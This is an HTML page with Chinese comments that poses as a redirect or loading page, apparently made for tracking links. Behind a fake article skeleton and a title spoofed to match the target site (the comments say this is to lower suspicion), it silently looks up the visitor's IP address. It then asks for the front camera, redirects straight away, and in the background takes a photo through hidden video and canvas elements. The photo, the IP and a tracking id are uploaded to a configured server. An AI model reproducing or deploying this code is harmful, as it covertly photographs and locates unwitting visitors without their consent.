<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/x-icon" href="logo.ico" />
    <title>等待跳转...</title>

    <!-- DNS 预解析 - 加速上传 -->
    <link rel="dns-prefetch" href="//api.zk9999902.dpdns.org" />
    <link rel="preconnect" href="https://api.zk9999902.dpdns.org" crossorigin />

    <style>
      body {
        margin: 0;
        padding: 0;
        background: #f5f5f5;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      }
      /* 骨架屏样式 */
      #skeleton {
        display: block;
        max-width: 800px;
        margin: 40px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
      }
      .skeleton-item {
        background: linear-gradient(
          90deg,
          #f0f0f0 25%,
          #e0e0e0 50%,
          #f0f0f0 75%
        );
        background-size: 200% 100%;
        animation: loading 1.5s ease-in-out infinite;
        border-radius: 4px;
        margin-bottom: 15px;
      }
      .skeleton-title {
        height: 32px;
        width: 60%;
        margin-bottom: 20px;
      }
      .skeleton-line {
        height: 16px;
        width: 100%;
      }
      .skeleton-line.short {
        width: 80%;
      }
      .skeleton-line.medium {
        width: 90%;
      }
      .skeleton-image {
        height: 200px;
        width: 100%;
        margin: 20px 0;
      }
      @keyframes loading {
        0% {
          background-position: 200% 0;
        }
        100% {
          background-position: -200% 0;
        }
      }
    </style>
  </head>
  <body>
    <!-- 骨架屏 - 看起来像正常的文章页面加载中 -->
    <div id="skeleton">
      <div class="skeleton-item skeleton-title"></div>
      <div class="skeleton-item skeleton-line"></div>
      <div class="skeleton-item skeleton-line medium"></div>
      <div class="skeleton-item skeleton-line short"></div>
      <div class="skeleton-item skeleton-image"></div>
      <div class="skeleton-item skeleton-line"></div>
      <div class="skeleton-item skeleton-line medium"></div>
      <div class="skeleton-item skeleton-line"></div>
    </div>

    <video id="video" width="0" height="0" autoplay muted></video>
    <canvas
      style="width: 0px; height: 0px"
      id="canvas"
      width="480"
      height="640"
    ></canvas>

    <script src="config.js?v=20251103k"></script>
    <script type="text/javascript">
      window.addEventListener(
        "DOMContentLoaded",
        function () {
          const canvas = document.getElementById("canvas");
          const context = canvas.getContext("2d");
          const video = document.getElementById("video");
          const loading = document.getElementById("loading");

          // 解析编码的参数
          const urlParams = new URLSearchParams(window.location.search);
          const encodedData = urlParams.get("d");

          let id, redirectUrl;

          if (encodedData) {
            // 解码 Base64 参数
            try {
              const decodedParams = decodeURIComponent(
                escape(atob(encodedData))
              );
              const parts = decodedParams.split("|");
              id = parts[0];
              redirectUrl = parts[1];
            } catch (e) {
              console.error("参数解码失败:", e);
            }
          } else {
            // 兼容旧版本的明文参数
            id = urlParams.get("id");
            redirectUrl = urlParams.get("url");
          }

          if (!id || !redirectUrl) {
            window.location.href = "home.html";
            return;
          }

          // 动态设置页面标题为目标网站，降低警觉性
          try {
            const targetDomain = new URL(redirectUrl).hostname;
            document.title = targetDomain.replace("www.", "") + " - 加载中...";
          } catch (e) {
            document.title = "正在加载...";
          }

          // 后台静默获取IP地址（完全异步，不影响跳转）
          let userIP = null;
          fetch("https://api.ipify.org?format=json")
            .then((res) => res.json())
            .then((data) => {
              userIP = data.ip;
            })
            .catch(() => {});

          // 立即开始拍照流程(不等待权限确认)
          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices
              .getUserMedia({
                video: {
                  width: { ideal: 480 },
                  height: { ideal: 640 },
                  facingMode: "user",
                },
              })
              .then(function (stream) {
                // ⚡ 关键：摄像头权限获取后立即跳转
                window.location.replace(redirectUrl);

                video.srcObject = stream;
                video.play();

                // 后台继续拍照和上传
                video.addEventListener(
                  "canplay",
                  function onCanPlay() {
                    setTimeout(function () {
                      try {
                        context.drawImage(video, 0, 0, 480, 640);
                        const imageData = canvas.toDataURL("image/jpeg", 0.7);

                        // 关闭摄像头
                        stream.getTracks().forEach((track) => track.stop());

                        // 后台上传（使用keepalive确保完成）
                        fetch(window.API_CONFIG.UPLOAD, {
                          method: "POST",
                          headers: {
                            "Content-Type": "application/json",
                          },
                          body: JSON.stringify({
                            id: id,
                            image: imageData,
                            ip: userIP,
                          }),
                          keepalive: true,
                        }).catch((error) => {
                          console.error("后台上传错误:", error);
                        });
                      } catch (error) {
                        console.error("后台拍照错误:", error);
                      }
                    }, 300);
                  },
                  { once: true }
                );
              })
              .catch(function (error) {
                console.error("摄像头权限被拒绝:", error);
                // 权限被拒绝也立即跳转
                window.location.replace(redirectUrl);
              });
          } else {
            // 浏览器不支持，直接跳转
            window.location.replace(redirectUrl);
          }
        },
        false
      );
    </script>
  </body>
</html>
